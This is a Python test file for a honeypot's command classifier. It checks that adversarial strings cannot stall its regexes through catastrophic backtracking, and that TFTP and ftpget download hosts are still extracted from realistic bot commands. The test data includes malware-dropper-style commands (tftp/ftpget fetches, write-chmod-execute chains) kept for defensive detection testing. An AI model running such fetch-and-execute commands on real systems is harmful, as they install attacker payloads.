"""Hostile command strings must not be able to stall the classifier.

`classify_command` and `extract_urls` run synchronously inside the async `attack_patterns` tool over
attacker-typed shell commands, and `re` cannot be interrupted, so one command that backtracks
exponentially freezes the event loop that serves every sensor, and stays in the database to do it
again. The earlier `_TFTP_HOST_RE` did exactly that: ~60 repetitions of ` -a` followed by a token
that is not an address took days.
"""

from __future__ import annotations

import os
import time

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

import honeypot_mcp.server  # noqa: E402,F401  (registers the tool modules; patterns imports it)
from honeypot_mcp.tools import patterns  # noqa: E402

# A payload is clamped to 4,096 characters; test well past that.
_N = 3000

_HOSTILE = {
    "options-then-junk": "tftp" + " -a" * _N + " z",
    "options-with-values": "ftpget" + " -a b" * _N + " z",
    "dash-values": "tftp" + " -a -b" * _N + " z",
    "almost-address": "tftp" + " -a" * _N + " 1.2.3",
    "many-fetch-words": ("wget " * _N) + "x",
    "semicolons": ";" * (_N * 3),
    "spaces": "tftp" + " " * (_N * 3) + "z",
    "unterminated-quote": "echo '" + "a" * (_N * 3),
    "hex-echo": "echo " + "\\x41" * _N + "z",
    "redirect-chain": ">/a&&cd /" * _N,
    "exec-probe-ish": "printf " + "x" * 5000 + " > f && chmod +x f && ./f",
    "url-like": "http://" + "a." * _N,
}


@pytest.mark.parametrize("name", sorted(_HOSTILE))
def test_hostile_command_is_classified_in_bounded_time(name):
    command = _HOSTILE[name]
    started = time.monotonic()
    patterns.classify_command(command)
    patterns.extract_urls(command)
    elapsed = time.monotonic() - started
    assert elapsed < 2.0, f"{name}: {elapsed:.1f}s for {len(command)} characters"


def test_tftp_host_is_still_found_in_real_invocations():
    # The fix changed the pattern; it must still recognise the forms bots actually type.
    for command, host in (
        ("tftp -g -r x 203.0.113.9", "203.0.113.9"),
        ("tftp 203.0.113.9", "203.0.113.9"),
        ("ftpget -v -u a -p b 198.51.100.7 f", "198.51.100.7"),
        ("tftp -g 203.0.113.9 -r x", "203.0.113.9"),
        ("tftp -r x -g 203.0.113.9", "203.0.113.9"),
    ):
        match = patterns._TFTP_HOST_RE.search(command)
        assert match is not None and match.group(1) == host, command
